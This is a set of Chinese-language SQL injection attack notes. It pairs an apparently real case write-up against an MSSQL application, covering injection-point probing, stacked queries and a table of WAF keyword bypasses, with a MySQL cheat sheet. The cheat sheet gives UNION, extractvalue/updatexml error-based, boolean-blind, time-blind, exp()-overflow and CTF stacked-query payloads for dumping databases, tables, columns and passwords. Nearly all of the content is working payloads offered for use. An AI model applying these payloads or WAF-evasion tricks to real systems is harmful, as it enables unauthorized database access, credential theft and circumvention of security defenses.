流程  
1 确认注入点  
**① 单引号试探**  
eg：  
- 输入：`PeriodID = 2024-01'`
  - 拼入 SQL：`... AND PeriodID='2024-01''`
  - 响应：`字符串 '2024-01'' 后的引号不完整。\r\n“2024-01'”附近有语法错误。`
  - **怎么读**：词法层"引号不完整" → ①未参数化；②输入落在字符串字面量内；③报错文案 = MSSQL 中文版标准消息（MySQL 是 `near ''2024-01'''`，Oracle 是 `ORA-01756`）→ 直接确定数据库类型，且报错**原样回显** = 天然报错注入通道。

**② 注释闭合** —— 验证能否截断后续 SQL、定位槽位位置。  
- 输入：`2024-01'--` → 引号错误消失 → 报 `对象名 'hrv9..S_session' 无效`
- 输入：`2024-01'/*` → `缺少注释的结尾标记 '*/'`（块注释也生效）
- **怎么读**：`--` 截断成功 → 后续 `AND ...` 被注释 → 说明是**内联拼串**，非存储过程参数绑定 → 埋下"堆叠可行"伏笔；同时对象名错误再次回显库名 `hrv9`。

**③ 槽位边界探测（延续符测试）** —— 精确定位"唯一可延续的语法形态"，决定后面用哪种注入。  
- 依次测：`+`、`=`、`IN`、`LIKE`、`>`、`)`、`,`、`;`  
- 本案例结果（全部 200 且 SQL 原生报错）：  
  - `'+'` → `“+”附近有语法错误`  
  - `'='1'` → `“=”附近有语法错误`  
  - `' IN ('1')` → `关键字 'IN' 附近有语法错误`  
  - `' LIKE '1%'` → `关键字 'LIKE' 附近有语法错误`  
  - `')` → `“)”附近有语法错误`  
  - `';--` → 正常（对象名错误）  
- **怎么读**：普通 WHERE 谓词里 `AND`/`+`/`=` 全部是合法延续（不会语法错），这里全错 → 槽位**不在 WHERE 谓词**，而是**语句末尾的字符串字面量**，只有 `--`/`;`（和 `\n` 引发的引号行为）可延续 → **唯一可行的注入形态 = 堆叠语句**。负反馈探针照样给出关键情报。

## 阶段 3 — 确定注入类型与回显通道（决定"怎么拿数据"）

**为什么**：注入类型决定数据提取通道；通道优先级决定取证效率。

**优先级与每类的验证探针**：

| 类型 | 验证探针 | 通道特征 |
| --- | --- | --- |
| UNION 回显 | `ORDER BY N` 二分定列数 → `UNION SELECT 1,2,..N` | 最快，但需回显位 |
| 报错注入 | `1/0` 除零；`1/<表达式>` 类型转换错误带值 | 不需要回显位，确定性 |
| 布尔盲注 | 恒真 `AND '1'='1'` vs 恒假 `AND '1'='2'` 对照 | 逐字符二分爆破 |
| 时间盲注 | `WAITFOR DELAY '0:0:5'` 延时对照 | 无任何回显时兜底 |
| 堆叠查询 | `;` + 副作用语句（RAISERROR/PRINT） | 任意语句执行，范围最广 |

**本案例落点**：
- 槽位拒绝对比/布尔/表达式 → UNION 与布尔在槽位失效。
- 改走**堆叠 + 报错/时间通道**：
  - `;RAISERROR('SQLI-EXEC-OK',16,1);--` → 回显 `SQLI-EXEC-OK` ✓ 堆叠执行
  - `;PRINT 'x';--` → 回显 `x` ✓（消息通道）
  - `;SELECT 1/0;--` → 回显 `遇到以零作除数错误` ✓（报错通道）
  - `;WAITFOR DELAY '0:0:2'--` → 响应 2.4s ✓（时间通道）
- **关键结论**：语句1的"对象名无效"错误不中断批处理，堆叠语句照常执行 → 任意 SQL 通道成立。

---

## 阶段 4 — WAF 对抗（先摸规则，再绕过）

**为什么**：WAF 拦的是"请求文本里的关键字"，它看不见 SQL 执行结果。先低成本摸清规则边界，再按指纹选绕过。

**① 规则映射（一次一个变量，低速率）**：
- 结果分类：**493 页** = 网宿关键字规则；**403 页** = 自定义规则（页面含 `TOP_EVENTID: 923`）。
- 拦截清单：`AND`/`OR`/`UNION`/`select`/`cast`/`convert`/`waitfor`/`EXEC`/`DECLARE`/`db_name`/`@@version`/`@@servername`/`user_name` → 493；`sysobjects`/`sys.*`/`INFORMATION_SCHEMA`/`spt_values` → 403(923)。

**② 绕过手法（按成本从低到高，每条必须回验真执行）**：

| 手法 | 示例 | 结果 |
| --- | --- | --- |
| 大小写 | `SeLeCt` | ✗ 无效（规则大小写不敏感） |
| 关键字内注释 | `SEL/**/ECT` | ✗ MSSQL 词法器不支持（`SEL` 附近语法错误） |
| **关键字后空白/注释分隔** | `SELECT\t1/0`、`SELECT\x0b1/0`、`SELECT\x0c1/0`、`SELECT\xa01/0`、`SELECT\n1/0`、`SELECT/**/1/0` | **✓ 全部绕过 493 并真实执行** |
| **WAITFOR 制表符分隔** | `;\tWAITFOR\tDELAY'0:0:2'--` | ✓ 绕过并产生延时 |
| JSON `\u` 转义 | `\u0027--`（引号）、`\u0061\u006e\u0064`（and） | 引号 ✓ 直达；字母 ✗ 被 WAF 解码后仍拦截 |
| 堆叠 + 不碰被拦关键字 | `;RAISERROR(...)`/`;PRINT`/`;WAITFOR` | ✓ 全过 |
| 系统目录访问 | `sys.tables`/`sysobjects`/`INFORMATION_SCHEMA` | ✗ 403(923)，换 `OBJECT_ID`/`OBJECT_NAME`/`COL_NAME` 函数 ✓ |

**③ 回验纪律**：绕过只是"过了 WAF"，必须确认 SQL 真的执行了——`SELECT\t1/0` 必须出"除零错误"才算数；`WAITFOR\tDELAY` 必须有时延才算数。

---




判断数据库类型  
1' 报错  
看报错页区别  
各家延时注入语法判断  

union/**/select  
group_concat(table_name)  from information_schema.tables where table_schema = database()  
group_concat(column_name) from information_schema.columns where table_schema='facebook' and table_name = 'xxx'  
?id=-1' union select 1,2,group_concat(username ,id , password) from users--+  

------
报错注入  
extractvalue  
id='and(select extractvalue("anything",concat('~',(select语句))))  
id='and(select extractvalue(1,concat('~',(select database()))))  
id='and(select extractvalue(1,concat(0x7e,@@version)))  
查数据库名：id='and(select extractvalue(1,concat(0x7e,(select database()))))  
爆表名：id='and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))  
爆字段名：id='and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="TABLE_NAME"))))  
爆数据：id='and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))  

报错注入  
updatexml  
id='and(select updatexml("anything",concat('~',(select语句())),"anything"))  
'and(select updatexml(1,concat('~',(select database())),1))  
'and(select updatexml(1,concat(0x7e,@@database),1))  

针对mysql  
爆数据库名：'and(select updatexml(1,concat(0x7e,(select database())),0x7e))  
爆表名：'and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))  
爆列名：'and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name="TABLE_NAME")),0x7e))  
爆数据：'and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))  

--------- 
盲注  
常用函数  
  length（str）函数 返回字符串的长度  
	substr（str,poc,len）截取字符串,poc表示截取字符串的开始位，len表示截取字符串的长度  
	ascii（）返回字符的ascii码，返回该字符对应的ascii码  
	count（）：返回当前列的数量  
	case when (条件) then 代码1 else 代码2 end :条件成立，则执行代码1，否则执行代码2  
函数替换  
1、如果程序过滤了substr函数，可以用其他函数代替：效果与substr（）一样  
	left（str，index）从左边第index开始截取  
	right(str，index)从右边第index开始截取  
	substring（str，index）从左边index开始截取  
	mid（str，index，len）截取str从index开始，截取len的长度  
	lpad（str，len，padstr）  
	rpad（str，len，padstr）在str的左（右）两边填充给定的padstr到指定的长度len，返回填充的结果  

--------------
布尔盲注一般流程  
因为盲注不能直接用database（）函数得到数据库名，所以步骤如下：  
①判断数据库名的长度：and length(database())>11 回显正常；and length(database())>12 回显错误，说明数据库名是等于12个字符。  
②猜测数据库名（使用ascii码来依次判断）：and (ascii(substr(database(),1,1)))>100 --+ 通过不断测试，确定ascii值，查看asciii表可以得出该字符，通过改变database（）后面第一个数字，可以往后继续猜测第二个、第三个字母…    
③猜测表名：and (ascii(substr((select table_name from information_schema.tables where table.schema=database() limit 1,1)1,1)>144 --+ 往后继续猜测第二个、第三个字母…    加limit一次返回一个表
④猜测字段名（列名）：and (ascii(substr((select column_name from information_schema.columns where table.schema=database() and table_name=’数据库表名’ limit 0,1)1,1)>105 --+ 经过猜测 ascii为 105 为i 也就是表的第一个列名 id的第一个字母;同样,通过修改 limit 0,1 获取第二个列名 修改后面1,1的获取当前列的其他字段.  
⑤猜测字段内容：因为知道了列名，所以直接 select password from users 就可以获取password里面的内容，username也一样 and (ascii(substr(( select password from users limit 0,1),1,1)))=68--+  

报错法   
报错法就是使用 exp()方法，该方法在 709 数值之内不会报错，当大于等于 710，就会 报错。  
<img width="1174" height="670" alt="image" src="https://github.com/user-attachments/assets/d59b5fb9-0668-4db6-8e8e-1da42d10f944" />  
like+exp  
select * from student where id = '1' and exp(710-(database()like'a%')) and '1'   
select * from users where id =1 and exp(710-database()like'D%');  
like 被过滤的用法  
select * from users where id = 1 and exp(710-ascii(CURRENT_USER));

然后就是把 710 往上提升，直到正好 x-ascii(CURRENT_USER)=710 或者 709  
就可以判断可以个数值的 ascii 值。  
r 的 ascii 值为 114，因此可以使用 823 和 824 进行判断。  
select * from users where id = 1 and  
exp(823-ascii(CURRENT_USER));  
select * from users where id = 1 and  
exp(824-ascii(CURRENT_USER));  



时间盲注    
常用函数  
	sleep(n)：将程序挂起一段时间 n为n秒。  
	if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句。  
	
	使用sleep()函数和if()函数：`and (if(ascii(substr(database(),1,1))>100,sleep(10),null))  --+`   如果返回正确则 页面会停顿10秒，返回错误则会立马返回。只有指定条件的记录存在时才会停止指定的秒数。
时间盲注一般流程  
①猜测数据库名称长度：  
输入：id=1' and If(length(database()) > 1,1,sleep(5))--+  
用时：<1s，数据库名称长度>1  
…  
输入：id=1' and If(length(database()) >8 ,1,sleep(5))--+  
用时：5s，数据库名称长度=8  
得出结论：数据库名称长度等于8个字符。  
②猜测数据库名称的一个字符：  
输入：id=1' and If(ascii(substr(database(),1,1))=97,sleep(5),1)--+   
用时：<1s   
…  
输入：id=1' and If(ascii(substr(database(),1,1))=115,sleep(5),1)--+  
用时：5s  
得出结论：数据库名称的第一个字符是小写字母s。  
改变substr的值，以此类推第n个字母。最后猜出数据库名称。  
③猜测数据库表名：先猜测长度，与上面内容相似。  
④猜测数据库字段：先猜测长度，与上面内容相似。  
⑤猜测字段内容：先猜测长度，与上面内容相似。  

他的后端既然能做到数字回显字母不回显，说明有一个 或 结构，而且不直接回显flag  
select $_POST['query'] || flag from flag  
payload=*，1  
select *,1 from flag  
1 || flag  
select *,1 from flag  

--------------
堆叠注入  
1;show databases;  
1;show tables;  
show columns from Flag就不行。  

pipes_as_concat 把||当concat使用  
1;set sql_mode=pipes_as_concat;select 1  
payload:1;set sql_mode=pipes_as_concat;select 1  
#使用set sql_mode = pipes_as_concat将｜｜作为字符串连接函数  
那么sql语句就会为：  
select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag;  
即：
select 1;set sql_mode=pipes_as_concat;select concat(1,flag) from Flag;  
 
意思为：
输出1；将｜｜作为concat使用；将输出结果中的1和flag字段连接起来;  

payload:*,1  
1可以换成任何数字，但不能是其他（原因不知道）  
 
这样我们执行的语句就为：  
select *,1||flag from Flag  
即：  
select *,1 from Flag;  


 输入非零数字得到结果一直是1和而输入其余字符的数据就得不到回显=>来判断出内部的查询语句可能存在有||（即or：或运算）  
那么内置语句就可以猜测为：  
sql="select post['query'] || flag from Flag";  




